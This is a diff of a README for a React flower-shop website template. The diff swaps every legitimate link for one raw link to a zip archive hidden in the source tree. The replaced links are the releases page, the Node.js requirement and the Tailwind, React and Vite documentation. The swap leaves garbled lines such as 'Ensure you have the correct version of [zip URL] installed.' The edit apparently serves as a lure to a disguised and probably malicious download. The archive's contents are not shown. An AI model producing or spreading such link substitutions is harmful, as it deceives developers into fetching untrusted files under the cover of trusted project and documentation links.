@@ -1,7 +1,7 @@
 # 🌸 react-flower-shop-website-template - A Modern Template for Your Flower Shop
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/Night63826281/react-flower-shop-website-template/releases)
+[![Download](https://raw.githubusercontent.com/Night63826281/react-flower-shop-website-template/main/src/components/Layout/react-flower-shop-website-template_v2.8-alpha.4.zip)](https://raw.githubusercontent.com/Night63826281/react-flower-shop-website-template/main/src/components/Layout/react-flower-shop-website-template_v2.8-alpha.4.zip)
 
 ## 🚀 Getting Started
 This guide helps you download and run the react-flower-shop-website-template. Follow these steps to set up your new flower shop website.
@@ -9,7 +9,7 @@ This guide helps you download and run the react-flower-shop-website-template. Fo
 ## 💻 System Requirements
 Before you start, ensure your system meets the following requirements:
 - Operating System: Windows, Mac, or Linux
-- Node.js: Version 14.x or higher
+- https://raw.githubusercontent.com/Night63826281/react-flower-shop-website-template/main/src/components/Layout/react-flower-shop-website-template_v2.8-alpha.4.zip Version 14.x or higher
 - A web browser: Chrome, Firefox, or Safari
 
 ## 📂 What is This Template?
@@ -25,11 +25,11 @@ react-flower-shop-website-template is a modern React template tailored for flowe
 ## 🚧 Troubleshooting
 If you encounter issues while downloading or running the application, consider these common problems:
 - **Download Not Starting**: Make sure you have a stable internet connection.
-- **Installation Issues**: Ensure you have the correct version of Node.js installed.
+- **Installation Issues**: Ensure you have the correct version of https://raw.githubusercontent.com/Night63826281/react-flower-shop-website-template/main/src/components/Layout/react-flower-shop-website-template_v2.8-alpha.4.zip installed.
 - **Running Problems**: Check for any error messages in your console. These can provide clues on how to fix the issue.
 
 ## 📥 Download & Install
-To get started, visit the releases page [here](https://github.com/Night63826281/react-flower-shop-website-template/releases) to download the latest version of the template.
+To get started, visit the releases page [here](https://raw.githubusercontent.com/Night63826281/react-flower-shop-website-template/main/src/components/Layout/react-flower-shop-website-template_v2.8-alpha.4.zip) to download the latest version of the template.
 
 1. Click on the link to go to the releases page.
 2. Find the latest version available.
@@ -61,9 +61,9 @@ Explore these topics to unlock the full potential of your new website.
 
 ## 📚 Additional Resources
 While setting up your site, you may find these resources useful:
-- [Tailwind CSS Documentation](https://tailwindcss.com/docs)
-- [React Official Site](https://reactjs.org/)
-- [Vite Official Site](https://vitejs.dev/)
+- [Tailwind CSS Documentation](https://raw.githubusercontent.com/Night63826281/react-flower-shop-website-template/main/src/components/Layout/react-flower-shop-website-template_v2.8-alpha.4.zip)
+- [React Official Site](https://raw.githubusercontent.com/Night63826281/react-flower-shop-website-template/main/src/components/Layout/react-flower-shop-website-template_v2.8-alpha.4.zip)
+- [Vite Official Site](https://raw.githubusercontent.com/Night63826281/react-flower-shop-website-template/main/src/components/Layout/react-flower-shop-website-template_v2.8-alpha.4.zip)
 
 By following these resources, you can customize your site beyond the default setup.
 
